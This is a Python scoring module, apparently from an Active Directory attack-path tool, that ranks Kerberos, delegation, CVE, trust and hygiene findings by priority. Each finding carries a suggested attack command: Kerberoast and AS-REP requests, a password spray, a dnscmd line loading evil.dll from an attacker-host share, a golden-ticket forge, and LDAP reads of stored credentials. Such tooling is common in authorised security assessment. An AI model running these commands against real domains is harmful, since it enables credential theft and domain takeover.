"""
Scorer — cross-correlates all findings into a unified ranked attack path list.
"""



class Scorer:
    def rank(self, spns, asrep, delegations, cve_results, user_data,
             enc_audit=None, trusts=None, hygiene=None) -> list[dict]:
        targets = []

        for spn in spns:
            targets.append({
                "target":   spn["account"], "attack": "Kerberoast",
                "priority": spn["crack_score"],
                "severity": self._score_to_sev(spn["crack_score"]),
                "reason":   self._spn_reason(spn),
                "next_step":f"GetUserSPNs.py <domain>/<user>:<pass> -request-user {spn['account']} -outputfile {spn['account']}.hash",
                "category": "kerberos",
            })

        for user in asrep:
            targets.append({
                "target":   user["account"], "attack": "AS-REP Roast",
                "priority": user["crack_score"],
                "severity": "CRITICAL" if user["is_admin"] else "HIGH",
                "reason":   "Pre-auth disabled — offline crack with no creds needed"
                            + (" [ADMIN]" if user["is_admin"] else ""),
                "next_step":"GetNPUsers.py <domain>/<user>:<pass> -no-pass -usersfile users.txt",
                "category": "kerberos",
            })

        for d in delegations.get("unconstrained", []):
            targets.append({
                "target":   d["account"], "attack": "Unconstrained Delegation → TGT Capture",
                "priority": 95, "severity": "CRITICAL",
                "reason":   d["detail"], "next_step": d.get("next_step",""),
                "category": "delegation",
            })

        for d in delegations.get("constrained", []):
            if d["protocol_transition"]:
                targets.append({
                    "target":   d["account"], "attack": "Constrained Delegation (S4U2Self)",
                    "priority": 80, "severity": "HIGH",
                    "reason":   d["detail"], "next_step": d.get("next_step",""),
                    "category": "delegation",
                })

        for d in delegations.get("rbcd", []):
            targets.append({
                "target":   d["target"], "attack": "RBCD",
                "priority": 70, "severity": "HIGH",
                "reason":   d["detail"], "next_step": d.get("next_step",""),
                "category": "delegation",
            })

        for cve in cve_results:
            if cve.vulnerable:
                targets.append({
                    "target":   "Domain Controller",
                    "attack":   f"{cve.name} ({cve.cve_id})",
                    "priority": {"CRITICAL":98,"HIGH":85,"MEDIUM":60}.get(cve.severity.value,50),
                    "severity": cve.severity.value,
                    "reason":   cve.reason,
                    "next_step":cve.next_step.split("\n")[0] if cve.next_step else "",
                    "category": "cve",
                })

        policy = user_data.get("password_policy", {})
        for risk in policy.get("risks", []):
            if "lockout" in risk.lower():
                targets.append({
                    "target":"All Domain Users","attack":"Password Spray (no lockout)",
                    "priority":85,"severity":"CRITICAL","reason":risk,
                    "next_step":"nxc smb <DC_IP> -u users.txt -p passwords.txt --no-bruteforce",
                    "category":"policy",
                })

        for u in user_data.get("dns_admins", []):
            targets.append({
                "target":u["account"],"attack":"DnsAdmins → SYSTEM on DC",
                "priority":88,"severity":"HIGH","reason":u["detail"],
                "next_step":"dnscmd <DC_NAME> /config /serverlevelplugindll \\\\<ATTACKER_IP>\\share\\evil.dll",
                "category":"privesc",
            })

        for t in user_data.get("trusts", []):
            if t.get("risk") == "HIGH":
                targets.append({
                    "target":t["trusted_domain"],"attack":"Trust Abuse (SID Filtering Disabled)",
                    "priority":75,"severity":"HIGH","reason":t["detail"],
                    "next_step":f"# SID history injection across trust to {t['trusted_domain']}",
                    "category":"trust",
                })

        # Encryption audit findings
        if enc_audit:
            for dc in enc_audit.weak_dcs:
                targets.append({
                    "target": dc.account, "attack": "Weak DC Encryption (RC4/DES)",
                    "priority": 65, "severity": "HIGH",
                    "reason": f"DC supports weak encryption: {', '.join(dc.enc_types)}",
                    "next_step": "# Downgrade attacks possible — force RC4 in Kerberos exchanges",
                    "category": "encryption",
                })
            for a in enc_audit.des_accounts[:5]:
                targets.append({
                    "target": a.account, "attack": "DES Encryption Enabled",
                    "priority": 60, "severity": "HIGH",
                    "reason": f"Account uses DES — trivially crackable: {', '.join(a.enc_types)}",
                    "next_step": "# DES keys are trivially brute-forced",
                    "category": "encryption",
                })

        # Detailed trust findings from TrustMapper
        if trusts:
            for t in trusts:
                if t.risk in ("CRITICAL", "HIGH"):
                    targets.append({
                        "target": t.trust_partner,
                        "attack": f"Trust Abuse ({t.direction})",
                        "priority": 90 if t.risk == "CRITICAL" else 75,
                        "severity": t.risk,
                        "reason": t.note,
                        "next_step": f"# Pivot via trust to {t.trust_partner}",
                        "category": "trust",
                    })

        # Hygiene findings (defensive — flagged as attack surface items)
        if hygiene:
            for s in hygiene.sid_history:
                if s["risk"] == "CRITICAL":
                    targets.append({
                        "target": s["account"], "attack": "SID History Abuse",
                        "priority": 85, "severity": "CRITICAL",
                        "reason": s["detail"],
                        "next_step": "# Investigate same-domain SID History — possible persistence backdoor",
                        "category": "hygiene",
                    })

            krb = hygiene.krbtgt_age
            if krb.get("risk") in ("CRITICAL", "HIGH"):
                targets.append({
                    "target": "krbtgt", "attack": "Golden Ticket (stale krbtgt)",
                    "priority": 92 if krb["risk"] == "CRITICAL" else 78,
                    "severity": krb["risk"],
                    "reason": krb["detail"],
                    "next_step": "ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator",
                    "category": "hygiene",
                })

            for c in hygiene.credential_exposure:
                targets.append({
                    "target": c["account"], "attack": "Credential in AD Attribute",
                    "priority": 90 if c["is_admin"] else 72,
                    "severity": c["risk"],
                    "reason": c["detail"],
                    "next_step": f"# Read {c['field']} field: ldapsearch -x -b '<BASE>' '(sAMAccountName={c['account']})' {c['field']}",
                    "category": "hygiene",
                })

            for p in hygiene.primary_group_abuse:
                if p["risk"] == "HIGH":
                    targets.append({
                        "target": p["account"], "attack": "Hidden Group Membership (PrimaryGroupId)",
                        "priority": 68, "severity": "HIGH",
                        "reason": p["detail"],
                        "next_step": "# Account has hidden membership via primaryGroupId — enumerate actual privileges",
                        "category": "hygiene",
                    })

            laps = hygiene.laps_coverage
            if laps.get("risk") == "CRITICAL":
                targets.append({
                    "target": "All Workstations", "attack": "No LAPS — Shared Local Admin",
                    "priority": 82, "severity": "CRITICAL",
                    "reason": laps["detail"],
                    "next_step": "nxc smb <SUBNET> -u <USER> -p <PASS> --local-auth",
                    "category": "hygiene",
                })

            for s in hygiene.service_acct_hygiene:
                if s["risk"] in ("CRITICAL", "HIGH"):
                    targets.append({
                        "target": s["account"], "attack": "Weak Service Account Hygiene",
                        "priority": 65 if s["risk"] == "HIGH" else 80,
                        "severity": s["risk"],
                        "reason": s["detail"],
                        "next_step": "# Service account with SPN — Kerberoast + credential reuse",
                        "category": "hygiene",
                    })

        targets.sort(key=lambda x: x["priority"], reverse=True)
        seen, unique = set(), []
        for t in targets:
            key = (t["target"], t["attack"])
            if key not in seen:
                seen.add(key)
                unique.append(t)
        return unique

    def _spn_reason(self, spn):
        parts = []
        if spn.get("rc4_allowed"):       parts.append("RC4 allowed (fast crack)")
        age = spn.get("password_age_days")
        if age and age > 365:            parts.append(f"password {age}d old")
        if spn.get("is_admin"):          parts.append("ADMIN GROUP MEMBER")
        if spn.get("never_logged_in"):   parts.append("never logged in")
        return " | ".join(parts) if parts else "Standard SPN account"

    def _score_to_sev(self, score):
        if score >= 80: return "CRITICAL"
        if score >= 60: return "HIGH"
        if score >= 40: return "MEDIUM"
        return "LOW"
